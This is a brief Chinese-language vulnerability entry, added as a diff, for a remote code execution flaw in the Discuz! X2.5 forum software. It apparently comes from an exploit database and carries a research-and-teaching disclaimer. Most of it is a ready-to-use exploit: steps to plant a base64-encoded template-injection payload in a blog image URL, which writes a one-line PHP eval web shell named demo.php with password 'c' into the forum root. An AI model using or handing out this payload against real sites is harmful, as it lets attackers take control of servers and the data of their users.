@@ -1,0 +1,6 @@
+Discuz! X2.5 远程代码执行漏洞
+
+测试方法:
+
+@Sebug.net   dis
+本站提供程序(方法)可能带有攻击性,仅供安全研究与教学之用,风险自负!1.1.注册任意账户2.2.登陆用户，发表blog日志（注意是日志）3.3.添加图片，选择网络图片，地址{${fputs(fopen(base64_decode(ZGVtby5waHA),w),base64_decode(PD9waHAgQGV2YWwoJF9QT1NUW2NdKTsgPz5vaw))}}4.4.访问日志，论坛根目录下生成demo.php，一句话密码C
